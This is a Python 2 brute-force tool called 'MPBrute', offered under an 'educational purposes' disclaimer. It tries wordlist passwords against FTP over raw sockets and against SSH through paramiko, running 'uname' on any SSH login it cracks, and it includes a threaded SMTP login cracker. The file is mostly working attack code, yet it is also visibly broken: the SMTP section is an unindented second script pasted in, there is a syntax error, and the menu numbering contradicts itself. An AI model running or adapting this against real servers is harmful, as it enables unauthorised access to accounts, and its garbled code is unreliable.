##############################################################
# This script was created only for educational purposes      #
# I don't take responsible for actions you do in illegal way #
# Tested and verified in Python 2.7.12                       #
# OS Verified : Kali Linux, Debian                           #
# Made in Republic of Kosovo                                 #
# You need to install paramiko (Python)                      #
##############################################################
import socket
import time
logo = ""
logo +="    __  __           _        _         _  __                          \n"
logo +="   |  \/  |         | |      (_)       | |/ /                          \n"
logo += "  | \  / | __ _  __| | ___   _ _ __   | ' / ___  ___  _____   _____  \n"
logo +="   | |\/| |/ _` |/ _` |/ _ \ | | '_ \  |  < / _ \/ __|/ _ \ \ / / _ \  \n"
logo +="   | |  | | (_| | (_| |  __/ | | | | | | . \ (_) \__ \ (_) \ V / (_) | \n"
logo +="   |_|  |_|\__,_|\__,_|\___| |_|_| |_| |_|\_\___/|___/\___/ \_/ \___/  \n\n"
print logo
print "                  #   Welcome to Simple MPBrute    #       "
print "                 ##  Write 1 for FTP - 2 for SSH - 2 for smtp  ##      "
print "                ###  Author: Ermal Ahmedi and Florian Kunushevci     ###     "
def homeask1():
	homeask = raw_input("MPBrute../> ")
        if homeask == "1":
                ftp()
        elif homeask == "2":
                ssh()
        elif homeask == "3":
                smtp()
        else:
                print "[+] Error while typing! [+]"
		homeask1()
def ftp():
	host = raw_input("Type Host:../> ")
	wordlist = raw_input('Type wordlist file:../> ')
	username = raw_input("Type Username:../>")
	wordlist = open(wordlist)
	print ""
	for i in wordlist.readlines():
		password = i.strip("\n")
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, 21))
			data = s.recv(1024)
			time.sleep(0.5)
			s.send("USER " + username + "\r\n" . format(username))
			data = s.recv(1024)
			time.sleep(0.5)
			s.send("PASS " + password + "\r\n" . format(password))
			data = s.recv(1024)
			if "530" in data:
                                print "[+] Error not Cracked!: " + password + " [+]"
                        elif "230" in data:
                                print "[+] Cracked: " + password + " [+]"
                                break
			time.sleep(0.5)
		except socket.error, exc:
    			print "[+] Error :  %s [+]" % exc
    			if wordlist = "":
    				print "[+] Insert a wordlist:  [+]"
    				break

def ssh():
	import paramiko
	print ""
	host = raw_input("Type Host:../> ")
	username = raw_input("Type Username:../> ")
	wordlist = raw_input('Type wordlist file:../> ')
	wordlist = open(wordlist)
	print ""
	for i in wordlist.readlines():
        	password = i.strip("\n")
        	try:
                	ssh = paramiko.SSHClient()
                	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                	ssh.connect(host, username=username, password=password)
                	time.sleep(1)
                	print "[+] Cracked : " + password + "[+]"
                	stdin,stdout,stderr = ssh.exec_command("uname -s -r -v")
                	for line in stdout.readlines():
                        	print line.strip()
                        	break
                	ssh.close()
        	except paramiko.AuthenticationException:
                	print "[+] Error not Cracked: " + password + " [+]"
        	except socket.error, exc:
                	print "[+] Error : %s [+]" % exc
                	break
def telnet():
	print "Under Construction - Telnet"
	#!usr/bin/python

def smtp():
import paramiko
import threading, time, random, sys, smtplib, socket
from smtplib import SMTP
from copy import copy

if len(sys.argv) !=4:
	print "Usage: ./ahmedi.py <server> <userlist> <wordlist>"
	sys.exit(1)
try:	
	helo = smtplib.SMTP(sys.argv[1])
	name = helo.helo()
	helo.quit()
except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException):
	name = "Server doesn't support the Helo cmd"

try:
  	users = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
  
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

print "\n\t   brut@ahmedi.net"
print "\t--------------------------------------------------\n"
print "[+] Server:",sys.argv[1]
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words)
print "[+] Helo message:",name,"\n"

wordlist = copy(words)

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])
		
	else:
		print "\nReloading Wordlist - Changing User\n"
		reloader()
		value = random.sample(words,  1)
		users.remove(users[0])
		
	lock.release()
	return value[0][:-1], users[0][:-1]
		
class Worker(threading.Thread):
	
	def run(self):
		value, user = getword()
		try:
			print "-"*12
			print "User:",user,"Password:",value
			smtp = smtplib.SMTP(sys.argv[1])
			smtp.login(user, value)
			print "\t\nLogin successful:",user, value
			smtp.quit()
			work.join()
			sys.exit(2)
		except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException), msg: 
			
			pass
 
for i in range(len(words)*len(users)):
	work = Worker()
	work.start()
	time.sleep(1)

homeask1()
